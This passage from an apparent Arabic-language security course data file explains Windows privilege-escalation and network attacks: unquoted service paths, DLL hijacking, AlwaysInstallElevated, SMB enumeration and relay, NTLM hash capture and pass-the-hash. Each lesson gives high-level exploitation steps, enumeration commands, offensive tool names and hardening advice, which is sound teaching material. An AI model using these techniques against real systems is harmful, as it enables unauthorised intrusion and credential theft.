SharpUp
BloodHound</code></pre>

        <h3>مراحل الاستغلال:</h3>

        <p>1. الحصول على shell عادي.</p>
        <p>2. جمع معلومات النظام (Enumeration).</p>
        <p>3. البحث عن misconfigurations.</p>
        <p>4. استغلال الثغرة.</p>
        <p>5. الوصول إلى Administrator أو SYSTEM.</p>

        <h3>Example Exploitation Idea (مفاهيمي):</h3>

        <p>إذا كانت خدمة تعمل بصلاحيات SYSTEM وملفها التنفيذي قابل للتعديل، يمكن استبداله ببرنامج خبيث ليتم تشغيله تلقائياً بصلاحيات عالية.</p>

        <h3>Indicators of Weak Configuration:</h3>

        <p>1. خدمات غير محمية.</p>
        <p>2. ملفات قابلة للكتابة في Program Files.</p>
        <p>3. مهام مجدولة بصلاحيات SYSTEM.</p>
        <p>4. وجود credentials مخزنة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تطبيق مبدأ أقل صلاحية (Least Privilege).</b></p>
        <p><b>2. حماية ملفات الخدمات.</b></p>
        <p><b>3. تفعيل UAC بشكل صارم.</b></p>
        <p><b>4. مراجعة Scheduled Tasks.</b></p>
        <p><b>5. منع كتابة المستخدم في Program Files.</b></p>
        <p><b>6. استخدام تحديثات أمنية مستمرة.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>icacls "C:\\Program Files" /inheritance:r</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Windows Privilege Escalation من أخطر مراحل الهجوم لأنها تنقل المهاجم من مستخدم محدود إلى تحكم كامل في النظام (SYSTEM)، مما يؤدي إلى السيطرة الكاملة على الجهاز والبيانات والخدمات.</p>
    `
},




{
    "title": "Unquoted Service Path Vulnerability",
    "summary": `
        <p>تُعتبر <b>Unquoted Service Path Vulnerability</b> من أشهر ثغرات <b>Privilege Escalation</b> في Windows، وتحدث عندما يتم تعريف مسار خدمة (Service) يحتوي على مسافات بدون استخدام علامات اقتباس (Quotes).</p>

        <p>هذا الخطأ في التكوين قد يسمح للنظام بتنفيذ ملف خاطئ بدلاً من الملف الأصلي، وغالباً ما يؤدي ذلك إلى تشغيل كود بصلاحيات مرتفعة مثل <b>SYSTEM</b>.</p>

        <h3>ما هي فكرة الثغرة؟</h3>

        <p>عند تشغيل خدمة في Windows، يقوم النظام بقراءة المسار التنفيذي (Executable Path). إذا كان المسار يحتوي على مسافات ولم يتم وضعه بين علامات اقتباس، يقوم Windows بتقسيمه بطريقة قد تؤدي إلى تنفيذ ملف غير مقصود.</p>

        <h3>مثال على مسار خاطئ:</h3>

        <pre><code>C:\\Program Files\\My App\\service.exe</code></pre>

        <p>هنا توجد مسافات بين الكلمات (Program Files / My App).</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن Windows قد يحاول تنفيذ الملفات بهذه الطريقة:</p>

        <pre><code>C:\\Program.exe
C:\\Program Files\\My.exe
C:\\Program Files\\My App\\service.exe</code></pre>

        <p>إذا وُجد ملف خبيث في أحد هذه المسارات، يمكن تنفيذه بدلاً من البرنامج الأصلي.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يتم إنشاء خدمة بدون وضع علامات اقتباس حول المسار:</p>

        <pre><code>ImagePath: C:\\Program Files\\My App\\service.exe</code></pre>

        <p>بدلاً من:</p>

        <pre><code>ImagePath: "C:\\Program Files\\My App\\service.exe"</code></pre>

        <h3>فحص الخدمات:</h3>

        <pre><code>sc qc ServiceName</code></pre>

        <p>هذا الأمر يعرض إعدادات الخدمة بما في ذلك مسار التشغيل.</p>

        <h3>مثال على خدمة ضعيفة:</h3>

        <pre><code>Binary Path: C:\\Program Files\\Vulnerable App\\app.exe</code></pre>

        <p>إذا لم يكن هناك Quotes، تصبح الخدمة قابلة للاستغلال.</p>

        <h3>فكرة الاستغلال (مفاهيمي):</h3>

        <p>المهاجم يبحث عن مجلد في المسار لديه صلاحية كتابة، ثم يضع ملفاً تنفيذياً باسم يتطابق مع الجزء الأول من المسار.</p>

        <h3>أمثلة على أسماء الملفات المستهدفة:</h3>

        <pre><code>Program.exe
My.exe
App.exe</code></pre>

        <h3>لماذا يتم تنفيذ الملف بصلاحيات عالية؟</h3>

        <p>لأن الخدمة تعمل غالباً بصلاحيات SYSTEM أو Administrator، وبالتالي أي ملف يتم تشغيله عبرها سيكتسب نفس الصلاحيات.</p>

        <h3>مراحل الاستغلال (High Level):</h3>

        <p>1. تحديد خدمة تحتوي على مسار غير مقتبس.</p>
        <p>2. فحص صلاحيات المجلدات في المسار.</p>
        <p>3. إنشاء ملف خبيث باسم مناسب.</p>
        <p>4. انتظار إعادة تشغيل الخدمة أو النظام.</p>
        <p>5. تنفيذ الكود بصلاحيات مرتفعة.</p>

        <h3>أدوات التحليل:</h3>

        <pre><code>wmic service get name,displayname,pathname
sc qc
accesschk.exe
winPEAS</code></pre>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. وجود مسارات تحتوي على مسافات بدون Quotes.</p>
        <p>2. وجود صلاحيات كتابة في مجلدات داخل Program Files.</p>
        <p>3. خدمات تعمل بصلاحيات SYSTEM.</p>

        <h3>مثال خطير:</h3>

        <pre><code>C:\\Program Files\\Common Tools\\Service.exe</code></pre>

        <p>قد يؤدي إلى استغلال إذا لم يتم اقتباس المسار.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. استخدام علامات اقتباس دائماً في Service Paths:</b></p>

        <pre><code>"C:\\Program Files\\App\\service.exe"</code></pre>

        <p><b>2. منع كتابة المستخدمين في Program Files.</b></p>

        <p><b>3. تطبيق مبدأ أقل صلاحية (Least Privilege).</b></p>

        <p><b>4. مراجعة الخدمات بشكل دوري.</b></p>

        <p><b>5. استخدام أدوات فحص أمنية للكشف عن misconfigurations.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>sc config ServiceName binPath= "\"C:\\Program Files\\App\\service.exe\""</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Unquoted Service Path Vulnerability خطيرة جداً لأنها تعتمد على خطأ بسيط في تكوين الخدمة، لكنها قد تؤدي إلى تنفيذ كود بصلاحيات SYSTEM وبالتالي تحقيق Privilege Escalation كامل في النظام.</p>
    `
},



{
    "title": "DLL Hijacking في Windows",
    "summary": `
        <p>تُعتبر <b>DLL Hijacking</b> من تقنيات <b>Privilege Escalation</b> و <b>Code Execution</b> في Windows، وتحدث عندما يقوم برنامج بتحميل ملفات DLL (Dynamic Link Libraries) من مسارات غير آمنة أو غير محددة بشكل صحيح.</p>

        <p>إذا تمكن المهاجم من وضع DLL خبيث في مسار يتم البحث فيه قبل المسار الأصلي، يمكن تشغيل كود خبيث داخل نفس عملية البرنامج، وأحياناً بصلاحيات عالية.</p>

        <h3>ما هي DLL ؟</h3>

        <p>DLL هي ملفات تحتوي على دوال (Functions) تستخدمها البرامج لتقليل الحجم وإعادة استخدام الكود.</p>

        <p>مثال على DLL شائعة:</p>

        <pre><code>kernel32.dll
user32.dll
advapi32.dll</code></pre>

        <h3>كيف يتم تحميل DLL في Windows ؟</h3>

        <p>عند تشغيل برنامج، يقوم Windows بالبحث عن ملفات DLL حسب ترتيب معين من المسارات (DLL Search Order).</p>

        <h3>ترتيب البحث (مبسط):</h3>

        <p>1. المجلد الحالي (Current Directory)</p>
        <p>2. مجلد البرنامج</p>
        <p>3. System32</p>
        <p>4. مجلدات النظام</p>
        <p>5. PATH</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يعتمد البرنامج على تحميل DLL بدون تحديد المسار الكامل، مما يسمح بتحميل نسخة خبيثة إذا وُجدت في مسار أعلى أولوية.</p>

        <h3>الفكرة الأساسية:</h3>

        <p>إذا كان البرنامج يبحث عن:</p>

        <pre><code>example.dll</code></pre>

        <p>وتم وضع ملف بنفس الاسم في مجلد قابل للوصول، قد يتم تحميله بدلاً من النسخة الأصلية.</p>

        <h3>مثال خطير:</h3>

        <p>برنامج يعمل بصلاحيات Administrator يقوم بتحميل DLL بدون تحديد مسار.</p>

        <p>إذا تمكن المهاجم من وضع DLL خبيث في نفس مجلد البرنامج، سيتم تنفيذه داخل العملية.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن الكود داخل DLL يتم تنفيذه داخل نفس سياق البرنامج (Process Context)، وبالتالي يرث نفس الصلاحيات.</p>

        <h3>أنواع DLL Hijacking:</h3>

        <p>1. <b>Search Order Hijacking</b></p>
        <p>استغلال ترتيب البحث عن DLL.</p>

        <p>2. <b>Phantom DLL Loading</b></p>
        <p>تحميل DLL غير موجود أصلاً في النظام.</p>

        <p>3. <b>Path Relative Hijacking</b></p>
        <p>تحميل DLL من مسار نسبي.</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>LoadLibrary("example.dll");</code></pre>

        <p>بدلاً من:</p>

        <pre><code>LoadLibrary("C:\\Windows\\System32\\example.dll");</code></pre>

        <h3>كيف يتم الاستغلال (مفاهيمي):</h3>

        <p>المهاجم يقوم بوضع DLL خبيث بنفس اسم DLL الذي يبحث عنه البرنامج داخل مجلد يتم فحصه قبل المسار الأصلي.</p>

        <h3>أمثلة على DLLs مستهدفة:</h3>

        <pre><code>version.dll
winhttp.dll
cryptbase.dll
ws2_32.dll</code></pre>

        <h3>أدوات الكشف:</h3>

        <pre><code>Process Monitor (ProcMon)
Dependency Walker
PEStudio
winPEAS
PowerSploit</code></pre>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. تحميل DLLs بدون مسارات مطلقة.</p>
        <p>2. وجود مجلدات قابلة للكتابة ضمن PATH.</p>
        <p>3. برامج تعمل بصلاحيات مرتفعة.</p>
        <p>4. أخطاء Missing DLL أثناء التشغيل.</p>

        <h3>مثال على سيناريو خطير:</h3>

        <p>برنامج Service يعمل كـ SYSTEM ويبحث عن:</p>

        <pre><code>plugin.dll</code></pre>

        <p>إذا كان مجلد البرنامج قابل للكتابة، يمكن استبدال DLL.</p>

        <h3>مراحل الاستغلال (High Level):</h3>

        <p>1. تحليل البرنامج لمعرفة DLLs المطلوبة.</p>
        <p>2. تحديد ترتيب البحث (DLL Search Order).</p>
        <p>3. إيجاد مجلد قابل للكتابة.</p>
        <p>4. وضع DLL خبيث بنفس الاسم.</p>
        <p>5. تشغيل البرنامج أو إعادة تشغيل الخدمة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. استخدام مسارات مطلقة عند تحميل DLLs.</b></p>

        <p><b>2. تفعيل Safe DLL Search Mode.</b></p>

        <p><b>3. منع الكتابة في مجلدات التطبيقات.</b></p>

        <p><b>4. توقيع DLLs رقمياً (Code Signing).</b></p>

        <p><b>5. استخدام Windows Defender Application Control.</b></p>

        <p><b>6. تعطيل تحميل DLL من Current Directory عند الحاجة.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32);</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر DLL Hijacking من الثغرات الخطيرة لأنها تسمح بتنفيذ كود داخل عملية شرعية، وإذا كانت العملية تعمل بصلاحيات مرتفعة فقد تؤدي إلى Privilege Escalation أو تنفيذ أوامر خبيثة داخل النظام دون اكتشاف مباشر.</p>
    `
},



{
    "title": "AlwaysInstallElevated Exploit",
    "summary": `
        <p>تُعتبر <b>AlwaysInstallElevated</b> من أخطر إعدادات سوء التكوين (Misconfiguration) في Windows، وتُستخدم أحياناً في <b>Privilege Escalation</b> عندما يتم تفعيلها بشكل غير آمن داخل النظام.</p>

        <p>هذه الإعدادات تسمح بتثبيت ملفات MSI (Windows Installer Packages) بصلاحيات مرتفعة (SYSTEM) حتى لو كان المستخدم يملك صلاحيات عادية.</p>

        <h3>ما هي AlwaysInstallElevated ؟</h3>

        <p>هي سياسة في Windows تتحكم في طريقة تشغيل ملفات التثبيت MSI.</p>

        <p>عند تفعيلها، أي ملف MSI يتم تشغيله سيتم تثبيته بصلاحيات <b>SYSTEM</b>.</p>

        <h3>مفاتيح التسجيل (Registry Keys):</h3>

        <pre><code>HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer
HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer</code></pre>

        <h3>القيم المطلوبة لتكون الثغرة فعّالة:</h3>

        <pre><code>AlwaysInstallElevated = 1</code></pre>

        <p>إذا كانت القيمة 1 في كلا المفتاحين (HKLM و HKCU)، تصبح الثغرة فعالة.</p>

        <h3>كيف تحدث المشكلة؟</h3>

        <p>تحدث عندما يقوم المسؤول بتفعيل هذه السياسة على مستوى النظام والمستخدم في نفس الوقت، مما يسمح لأي مستخدم بتثبيت برامج بصلاحيات SYSTEM.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن ملفات MSI يمكن أن تحتوي على أوامر تثبيت وتشغيل سكربتات، وبالتالي يمكن تنفيذ كود خبيث بصلاحيات عالية.</p>

        <h3>فكرة الاستغلال (مفاهيمي):</h3>

        <p>المهاجم يقوم بإنشاء ملف MSI خبيث، ثم يقوم بتشغيله على النظام.</p>

        <p>بما أن AlwaysInstallElevated مفعلة، سيتم تنفيذ الملف بصلاحيات SYSTEM.</p>

        <h3>التحقق من وجود الثغرة:</h3>

        <pre><code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer</code></pre>

        <h3>سيناريو خطير:</h3>

        <p>1. المستخدم العادي يقوم بتشغيل ملف MSI.</p>
        <p>2. النظام يقوم بتثبيته بصلاحيات SYSTEM.</p>
        <p>3. يتم تنفيذ كود خبيث أثناء التثبيت.</p>

        <h3>ما هو MSI ؟</h3>

        <p>هو Windows Installer Package يُستخدم لتثبيت البرامج بشكل رسمي داخل النظام.</p>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. تفعيل AlwaysInstallElevated في كلا المفتاحين.</p>
        <p>2. إمكانية تشغيل MSI بدون صلاحيات Admin.</p>
        <p>3. تنفيذ عمليات بصلاحيات SYSTEM أثناء التثبيت.</p>

        <h3>أدوات الفحص:</h3>

        <pre><code>winPEAS
PowerUp
Seatbelt
reg.exe
Metasploit modules</code></pre>

        <h3>مراحل الاستغلال (High Level):</h3>

        <p>1. التحقق من إعدادات Registry.</p>
        <p>2. التأكد من تفعيل AlwaysInstallElevated.</p>
        <p>3. إنشاء MSI خبيث.</p>
        <p>4. تشغيل ملف MSI.</p>
        <p>5. الحصول على تنفيذ بصلاحيات SYSTEM.</p>

        <h3>أخطر النتائج:</h3>

        <p>1. تنفيذ أوامر SYSTEM.</p>
        <p>2. تثبيت Backdoors.</p>
        <p>3. التحكم الكامل بالنظام.</p>
        <p>4. سرقة بيانات حساسة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تعطيل AlwaysInstallElevated بالكامل:</b></p>

        <pre><code>0 بدل 1 في Registry</code></pre>

        <p><b>2. تطبيق Group Policy صارم.</b></p>

        <p><b>3. منع المستخدمين العاديين من تثبيت MSI.</b></p>

        <p><b>4. مراقبة عمليات التثبيت.</b></p>

        <p><b>5. استخدام مبدأ أقل صلاحية (Least Privilege).</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Disable MSI install for non-admin users</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر AlwaysInstallElevated Exploit من أخطر سوءات التكوين في Windows لأنها تحول أي مستخدم عادي إلى مستخدم قادر على تنفيذ أوامر بصلاحيات SYSTEM، مما يؤدي إلى Privilege Escalation كامل داخل النظام.</p>
    `
},



{
    "title": "SMB Enumeration Attack",
    "summary": `
        <p>تُعتبر <b>SMB Enumeration Attack</b> خطوة أساسية في مرحلة الاستطلاع (Reconnaissance) في بيئات Windows وActive Directory، حيث يتم استغلال بروتوكول SMB (Server Message Block) لجمع معلومات حساسة عن النظام أو الشبكة.</p>

        <p>الهدف من هذا النوع من الهجمات ليس الاختراق مباشرة، بل <b>اكتشاف ما هو مكشوف وضعيف</b> مثل المشاركات (Shares)، المستخدمين، السياسات، والإصدارات.</p>

        <h3>ما هو SMB ؟</h3>

        <p>SMB هو بروتوكول يستخدم لمشاركة الملفات والطابعات والموارد بين الأجهزة داخل الشبكة.</p>

        <p>يعمل غالباً على المنافذ:</p>

        <pre><code>445 / 139</code></pre>

        <h3>ما هو SMB Enumeration ؟</h3>

        <p>هو عملية استكشاف معلومات عبر SMB مثل:</p>

        <p>1. أسماء المستخدمين.</p>
        <p>2. المشاركات (Shared Folders).</p>
        <p>3. الصلاحيات على الموارد.</p>
        <p>4. إصدار النظام والخدمات.</p>

        <h3>لماذا SMB مهم للمهاجم؟</h3>

        <p>لأنه غالباً يحتوي على بيانات حساسة مثل ملفات داخلية، إعدادات، أو حتى كلمات مرور مخزنة بشكل خاطئ.</p>

        <h3>أنواع المعلومات الممكن جمعها:</h3>

        <h3>1. Shared Folders Enumeration</h3>

        <p>اكتشاف المجلدات المشتركة بين المستخدمين أو الأقسام.</p>

        <h3>2. User Enumeration</h3>

        <p>استخراج أسماء المستخدمين أو مجموعات Active Directory.</p>

        <h3>3. Session Enumeration</h3>

        <p>معرفة الجلسات النشطة داخل الشبكة.</p>

        <h3>4. System Information</h3>

        <p>معرفة إصدار Windows والخدمات المفتوحة.</p>

        <h3>كيف يحدث الضعف؟</h3>

        <p>يحدث عندما يتم ترك SMB بدون حماية قوية أو مع إعدادات تسمح بالوصول غير المقيد.</p>

        <h3>أخطاء شائعة:</h3>

        <p>1. السماح بالوصول Guest.</p>
        <p>2. عدم تفعيل SMB signing.</p>
        <p>3. مشاركة ملفات بدون صلاحيات.</p>
        <p>4. استخدام كلمات مرور ضعيفة.</p>

        <h3>فحص SMB على النظام:</h3>

        <pre><code>net view
net share
nmap -p 445 --script smb-enum-shares</code></pre>

        <h3>مثال على مشاركة ضعيفة:</h3>

        <pre><code>\\\\TARGET\\Public</code></pre>

        <p>إذا كانت بدون صلاحيات، يمكن لأي مستخدم الوصول إليها.</p>

        <h3>أدوات Enumeration:</h3>

        <pre><code>enum4linux
smbclient
crackmapexec
nmap smb scripts
rpcclient</code></pre>

        <h3>أمثلة على أوامر تحليلية:</h3>

        <pre><code>smbclient -L //target
rpcclient -U "" target</code></pre>

        <h3>لماذا تعتبر خطيرة؟</h3>

        <p>لأنها قد تكشف معلومات تساعد في:</p>

        <p>1. Password attacks.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Lateral movement داخل الشبكة.</p>

        <h3>سيناريو الهجوم (High Level):</h3>

        <p>1. فحص الشبكة واكتشاف SMB.</p>
        <p>2. جمع معلومات المشاركات والمستخدمين.</p>
        <p>3. تحديد نقاط ضعف في الصلاحيات.</p>
        <p>4. استخدام المعلومات في هجمات لاحقة.</p>

        <h3>علامات وجود ضعف:</h3>

        <p>1. وجود Shares بدون حماية.</p>
        <p>2. إمكانية الوصول Guest.</p>
        <p>3. معلومات مستخدمين مكشوفة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تعطيل SMBv1 (غير آمن).</b></p>
        <p><b>2. تفعيل SMB Signing.</b></p>
        <p><b>3. منع Guest access.</b></p>
        <p><b>4. تطبيق صلاحيات صارمة على Shares.</b></p>
        <p><b>5. مراقبة حركة الشبكة.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Disable SMBv1
Enable SMB Signing
Restrict share permissions</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر SMB Enumeration Attack خطوة تمهيدية خطيرة في الهجمات لأنها لا تخترق النظام مباشرة، لكنها توفر معلومات حساسة جداً تُستخدم لاحقاً في Privilege Escalation أو اختراق كامل للشبكة.</p>
    `
},




{
    "title": "SMB Relay Attack",
    "summary": `
        <p>تُعتبر <b>SMB Relay Attack</b> من هجمات الشبكات الخطيرة في بيئات Windows وActive Directory، حيث لا يقوم المهاجم بكسر كلمة المرور مباشرة، بل يقوم <b>بإعادة توجيه (Relay)</b> بيانات المصادقة الخاصة بالضحية إلى جهاز آخر لاستغلالها.</p>

        <p>هذه الهجمة تعتمد على اعتراض محاولات تسجيل الدخول عبر SMB ثم إعادة استخدامها فوراً على جهاز آخر قبل أن تنتهي صلاحية الجلسة.</p>

        <h3>ما هو SMB Relay ؟</h3>

        <p>هو أسلوب يتم فيه التقاط طلبات المصادقة (NTLM Authentication) وإعادة إرسالها إلى خادم آخر بهدف تسجيل الدخول باستخدام نفس بيانات الضحية.</p>

        <h3>كيف تعمل آلية NTLM ؟</h3>

        <p>في Windows، عند الاتصال بخدمة SMB يتم استخدام بروتوكول NTLM للمصادقة عبر تحدي/استجابة (Challenge-Response).</p>

        <h3>فكرة الهجوم الأساسية:</h3>

        <p>بدلاً من فك كلمة المرور، يقوم المهاجم بإعادة تمرير جلسة المصادقة إلى جهاز آخر قبل انتهاء صلاحيتها.</p>

        <h3>كيف يحدث الهجوم؟</h3>

        <p>1. الضحية تحاول الاتصال بخدمة SMB.</p>
        <p>2. المهاجم يعترض طلب المصادقة.</p>
        <p>3. يقوم بإعادة توجيه الطلب إلى خادم آخر.</p>
        <p>4. الخادم يقبل المصادقة ويتم تسجيل الدخول باسم الضحية.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن المهاجم لا يحتاج معرفة كلمة المرور، بل يستغل الجلسة نفسها للوصول إلى النظام.</p>

        <h3>الشروط الأساسية لنجاح الهجوم:</h3>

        <p>1. وجود NTLM authentication.</p>
        <p>2. عدم تفعيل SMB Signing.</p>
        <p>3. إمكانية اعتراض حركة الشبكة (MITM).</p>

        <h3>SMB Signing:</h3>

        <p>هي ميزة أمان تمنع تعديل أو إعادة إرسال حزم SMB بدون توقيع صحيح.</p>

        <p>إذا كانت غير مفعلة، يصبح الهجوم ممكناً.</p>

        <h3>سيناريو الهجوم (High Level):</h3>

        <p>1. المهاجم يضع نفسه في منتصف الاتصال (Man-in-the-Middle).</p>
        <p>2. ينتظر محاولات تسجيل الدخول عبر SMB.</p>
        <p>3. يعيد تمرير بيانات المصادقة إلى جهاز آخر.</p>
        <p>4. يحصل على جلسة صالحة بصلاحيات الضحية.</p>

        <h3>ما الفرق بين Relay و Pass-the-Hash ؟</h3>

        <p><b>Pass-the-Hash:</b> يستخدم الهاش مباشرة لتسجيل الدخول.</p>
        <p><b>SMB Relay:</b> يعيد تمرير جلسة المصادقة الحية دون معرفة الهاش.</p>

        <h3>أدوات شائعة (للاختبار الأمني):</h3>

        <pre><code>impacket-ntlmrelayx
Responder
mitm6
crackmapexec</code></pre>

        <h3>علامات وجود ضعف:</h3>

        <p>1. SMB Signing غير مفعّل.</p>
        <p>2. استخدام NTLM بدلاً من Kerberos.</p>
        <p>3. عدم وجود حماية ضد MITM.</p>

        <h3>كيفية اكتشاف SMB Relay:</h3>

        <p>1. مراقبة محاولات المصادقة المتكررة.</p>
        <p>2. تحليل الشبكة (Network Traffic Analysis).</p>
        <p>3. اكتشاف جلسات غير طبيعية.</p>

        <h3>أخطر النتائج:</h3>

        <p>1. الوصول إلى ملفات مشتركة.</p>
        <p>2. تنفيذ أوامر على الأجهزة الأخرى.</p>
        <p>3. الانتقال داخل الشبكة (Lateral Movement).</p>
        <p>4. سرقة بيانات حساسة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تفعيل SMB Signing على جميع الأجهزة.</b></p>
        <p><b>2. تعطيل NTLM واستخدام Kerberos قدر الإمكان.</b></p>
        <p><b>3. تقييد حركة SMB داخل الشبكة.</b></p>
        <p><b>4. استخدام Firewall داخلي.</b></p>
        <p><b>5. مراقبة حركة الشبكة باستمرار.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Require SMB Signing = Enabled
Disable NTLM where possible</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر SMB Relay Attack من أخطر هجمات الشبكات الداخلية لأنها لا تعتمد على كسر كلمات المرور، بل تستغل جلسات مصادقة حقيقية، مما يجعل اكتشافها أصعب ويزيد من خطر الحركة داخل الشبكة.</p>
    `
},



{
    "title": "NTLM Hash Capture",
    "summary": `
        <p>تُعتبر <b>NTLM Hash Capture</b> من الهجمات الشائعة في بيئات Windows وActive Directory، حيث يقوم المهاجم بمحاولة <b>التقاط بيانات المصادقة (NTLM Hashes)</b> بدلاً من كلمة المرور نفسها.</p>

        <p>هذه الهاشات يمكن استخدامها لاحقاً في هجمات أخرى مثل Pass-the-Hash أو SMB Relay دون الحاجة إلى معرفة كلمة المرور الأصلية.</p>

        <h3>ما هو NTLM ؟</h3>

        <p>NTLM (NT LAN Manager) هو بروتوكول مصادقة قديم في Windows يعتمد على تبادل تحدي/استجابة (Challenge-Response).</p>

        <h3>ما هو NTLM Hash ؟</h3>

        <p>هو تمثيل مشفّر لكلمة المرور يُستخدم أثناء المصادقة، وليس كلمة المرور نفسها.</p>

        <p>مثال:</p>

        <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>

        <h3>كيف يتم التقاط NTLM Hash ؟</h3>

        <p>يحدث عندما يتم خداع جهاز الضحية لإرسال بيانات المصادقة إلى جهاز المهاجم بدلاً من السيرفر الحقيقي.</p>

        <h3>طرق شائعة لالتقاط الـ Hash:</h3>

        <h3>1. Responder Attack</h3>

        <p>يتم إنشاء خادم مزيف داخل الشبكة يستجيب لطلبات SMB/HTTP ويجبر الأجهزة على إرسال بيانات NTLM.</p>

        <h3>2. LLMNR / NBT-NS Poisoning</h3>

        <p>استغلال بروتوكولات اسم الشبكة لإجبار الأجهزة على إرسال بيانات المصادقة.</p>

        <h3>3. Rogue SMB Server</h3>

        <p>إعداد خادم SMB مزيف ينتظر محاولات الاتصال.</p>

        <h3>4. MITM (Man-in-the-Middle)</h3>

        <p>اعتراض حركة الشبكة بين العميل والخادم.</p>

        <h3>كيف يحدث الهجوم؟</h3>

        <p>1. الجهاز يحاول الوصول إلى مشاركة شبكة.</p>
        <p>2. يتم توجيه الطلب إلى المهاجم (بدلاً من السيرفر الحقيقي).</p>
        <p>3. الجهاز يرسل NTLM Hash للمهاجم.</p>
        <p>4. المهاجم يقوم بتخزينه أو إعادة استخدامه.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن الـ Hash يمكن استخدامه مباشرة في هجمات أخرى بدون الحاجة لفك التشفير.</p>

        <h3>أنواع NTLM Hashes:</h3>

        <p>1. NTLMv1 (ضعيف وقديم)</p>
        <p>2. NTLMv2 (أكثر أماناً لكن ما زال قابل للاستغلال في بعض السيناريوهات)</p>

        <h3>سيناريو شائع:</h3>

        <p>1. إرسال طلب إلى مشاركة غير موجودة.</p>
        <p>2. النظام يبحث عبر الشبكة.</p>
        <p>3. المهاجم يرد أولاً.</p>
        <p>4. الضحية ترسل بيانات المصادقة.</p>

        <h3>أدوات شائعة (للاختبار الأمني):</h3>

        <pre><code>Responder
impacket-smbserver
mitm6
ntlmrelayx</code></pre>

        <h3>ما الذي يمكن فعله بالـ Hash المسروق؟</h3>

        <p>1. Pass-the-Hash Authentication.</p>
        <p>2. SMB Relay Attacks.</p>
        <p>3. محاولة كسر الهاش Offline.</p>
        <p>4. Lateral Movement داخل الشبكة.</p>

        <h3>علامات وجود ضعف:</h3>

        <p>1. تفعيل LLMNR / NBT-NS.</p>
        <p>2. استخدام NTLM بدلاً من Kerberos.</p>
        <p>3. عدم وجود SMB Signing.</p>

        <h3>طرق الكشف:</h3>

        <p>1. مراقبة الشبكة (Wireshark).</p>
        <p>2. تحليل SMB authentication logs.</p>
        <p>3. اكتشاف traffic غير طبيعي إلى أجهزة غير معروفة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تعطيل LLMNR و NBT-NS.</b></p>
        <p><b>2. تفضيل Kerberos على NTLM.</b></p>
        <p><b>3. تفعيل SMB Signing.</b></p>
        <p><b>4. استخدام DNS آمن بدل broadcast name resolution.</b></p>
        <p><b>5. تقييد المصادقة عبر الشبكة.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Disable LLMNR
Disable NBT-NS
Enforce Kerberos Authentication</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر NTLM Hash Capture خطيرة لأنها لا تحتاج لكسر كلمة المرور، بل تعتمد على خداع النظام للحصول على بيانات المصادقة، والتي يمكن استخدامها لاحقاً للوصول إلى أنظمة أخرى داخل الشبكة.</p>
    `
},




{
    "title": "Pass The Hash (PTH) Attack",
    "summary": `
        <p>تُعتبر <b>Pass The Hash (PTH)</b> من أخطر هجمات المصادقة في بيئات Windows وActive Directory، حيث يسمح للمهاجم باستخدام <b>NTLM Hash</b> مباشرة لتسجيل الدخول إلى الأنظمة بدون الحاجة لمعرفة كلمة المرور الأصلية.</p>

        <p>الفكرة الأساسية هي أن Windows في بعض الحالات لا يحتاج كلمة المرور النصية، بل يقبل الهاش كوسيلة تحقق داخل بروتوكول NTLM.</p>

        <h3>ما هو Pass The Hash ؟</h3>

        <p>هو أسلوب هجوم يتم فيه إعادة استخدام NTLM Hash الخاص بالمستخدم لتسجيل الدخول كأنه كلمة مرور صحيحة.</p>

        <h3>كيف يحدث ذلك؟</h3>

        <p>بدلاً من محاولة كسر كلمة المرور، يقوم المهاجم باستخدام الهاش مباشرة لإثبات الهوية.</p>

        <h3>كيف يتم الحصول على الـ Hash ؟</h3>

        <p>1. NTLM Hash Capture.</p>
        <p>2. Dumping SAM database.</p>
        <p>3. Memory dumping (LSASS).</p>
        <p>4. Credential dumping tools.</p>

        <h3>لماذا هذا الهجوم خطير؟</h3>

        <p>لأنه لا يحتاج إلى فك تشفير كلمة المرور، وبالتالي ينجح حتى لو كانت كلمة المرور قوية جداً.</p>

        <h3>آلية العمل (مفاهيمياً):</h3>

        <p>1. النظام يطلب مصادقة NTLM.</p>
        <p>2. المهاجم يقدم الهاش بدلاً من كلمة المرور.</p>
        <p>3. النظام يتحقق من الهاش ويقبل الدخول.</p>

        <h3>الأنظمة المستهدفة:</h3>

